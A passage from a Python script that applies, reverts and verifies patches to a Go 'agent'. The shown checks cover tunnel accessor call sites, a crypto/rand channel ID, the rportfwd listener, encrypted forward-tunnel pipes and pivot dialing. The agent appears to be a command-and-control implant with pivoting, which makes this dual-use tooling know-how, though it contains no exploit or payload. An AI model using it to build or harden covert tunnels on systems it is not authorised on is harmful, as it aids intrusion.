        ok &= ck(False, "", "V4 执行异常：%s" % ex)

    print("== V5 复用是「真复用」：预置连接表只有一处写入方 ==")
    s = _code_only(rd(T_TASKS))
    # ★ 判据订正：这里必须数**调用点**，不能数函数名 ——
    #   s.count("axPutPreconn(") 会把 `func axPutPreconn(` 这个定义也算进去，
    #   于是"1 处调用"永远报成 2（本批次实际踩到）。改用完整调用签名计数。
    ok &= ck(s.count("axPutPreconn(channelId, clientConn)") == 1,
             "axPutPreconn 调用点 1 处（只有反向路径写）",
             "axPutPreconn 调用点 %d 处（应为 1）⇒ 正向路径可能被误改"
             % s.count("axPutPreconn(channelId, clientConn)"))
    ok &= ck(s.count("axTakePreconn(params.ChannelId)") == 1,
             "axTakePreconn 调用点 1 处（只在 jobTunnel 里读）",
             "axTakePreconn 调用点 %d 处（应为 1）"
             % s.count("axTakePreconn(params.ChannelId)"))
    ok &= ck(s.count("func axPutPreconn(") == 1 and s.count("func axTakePreconn(") == 1,
             "两个访问器各定义 1 次",
             "访问器定义数异常（axPutPreconn=%d axTakePreconn=%d）"
             % (s.count("func axPutPreconn("), s.count("func axTakePreconn(")))
    # ★ 同一条坑的第二次应用：`axRandChannelId()` 也出现在它自己的定义行里
    #   （`func axRandChannelId() int {`）⇒ 必须数**赋值式**调用签名。
    ok &= ck(s.count("channelId := axRandChannelId()") == 1 and s.count("func axRandChannelId(") == 1,
             "channelId 由 crypto/rand 派生：调用 1 次 + 定义 1 次",
             "axRandChannelId 计数异常（调用=%d 定义=%d）"
             % (s.count("channelId := axRandChannelId()"), s.count("func axRandChannelId(")))
    ok &= ck("math/rand" not in s,
             "未引入 math/rand（channelId 不可预测）",
             "引入了 math/rand ⇒ channelId 可预测，正/反向通道可能撞同一张 TUNNELS 表")
    ok &= ck(s.count("net.Listen(") == 1,
             "agent 侧 net.Listen 1 处（只有 rportfwd 用）",
             "agent 侧 net.Listen %d 处（应为 1）⇒ 交付 agent 的监听面超出预期" % s.count("net.Listen("))
    i_push = s.find("if !pushTunnelAccept(")
    i_put = s.find("axPutPreconn(channelId, clientConn)")
    ok &= ck(0 < i_push < i_put,
             "顺序正确：先推 ACCEPT（偏移 %d）再开 TUNNEL_PACK（偏移 %d）" % (i_push, i_put),
             "顺序错：ACCEPT 推送位置 %d 未在 TUNNEL_PACK 之前 %d ⇒ 会重演静默假成功" % (i_push, i_put))

    print("== V6 正向路径未被削：jobTunnel 的管道仍在原地 ==")
    for token in ("axDirKey(tunKey, tunIv, axKeyLabelTunA2S)",
                  "axDirKey(tunKey, tunIv, axKeyLabelTunS2A)",
                  "ctrl.Paused.Load()",
                  "TUNNELS.Store(params.ChannelId, ctrl)"):
        ok &= ck(token in s, "复用锚在场：%s" % token, "复用锚丢失：%s ⇒ 正向管道被破坏" % token)
    ok &= ck(s.count("pivotDialTimeout") >= 2,
             "dial 路径仍在（pivotDialTimeout 有定义 + 有使用）",
             "dial 路径可能被整段替换掉了")

    print("== V7 gofmt（只报不合规文件）==")
    for p in GOFMT_FILES:
        r = subprocess.run(["/usr/local/go/bin/gofmt", "-l", p], capture_output=True, text=True)
        out = (r.stdout or "").strip()
        print("  [%s] %s" % ("ok  " if not out else "warn", os.path.basename(p)))

    print("== V8 回滚点是当前状态的「正向可重放 pre-image」==")
    # ★ 判据用意：revert 的可信度不能靠假设。这里把 .bak 用同一组 old->new 正向重放一遍，
    #   必须逐字节等于当前文件 —— 等价于证明「revert 恰好回到打补丁前那一刻」。
    #   ★ 反面教训：.bak 的 mtime 是**被备份文件的 mtime**（shutil.copy2 保元数据），
    #     不是备份创建时刻 ⇒ 不能用 mtime 判断回滚点新旧（本项目踩过）。
    for p, old, new, why in TEXTS:
        b = EDBACK.get(p)
        if not b or not os.path.exists(b):
            ok &= ck(False, "", "缺回滚点 %s" % (b or p))
            continue
        sim = rd(b)
        for p2, o2, n2, w2 in TEXTS:
            if p2 == p:
                sim = sim.replace(o2, n2, 1)
        ok &= ck(sim == rd(p),
                 "%s 的 pre-image 可正向重放出当前文件（md5 %s）" % (os.path.basename(b), md5(b)[:8]),
                 "%s **不是**当前状态的 pre-image ⇒ revert 会回到一个错误的中间态" % os.path.basename(b))

    print("")
    print("RESULT: %s" % ("PASS（V1-V7 全绿）" if ok else "FAIL（见上面 FAIL 行）"))
    return 0 if ok else 1


if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "status"
    if mode == "status":
        do_status()
    elif mode == "check":
        errs = lint()
        print("LINT: %s" % ("OK" if not errs else "FAIL"))
        for e in errs:
            print("  - %s" % e)
        for why, st, p in state():
            print("  [%-4s] %s" % (st, why))
        sys.exit(0 if not errs else 1)
    elif mode == "apply":
        sys.exit(do_apply())
    elif mode == "revert":
        sys.exit(do_revert())
    elif mode == "verify":
        sys.exit(do_verify())
    else:
        print(__doc__)
        sys.exit(2)
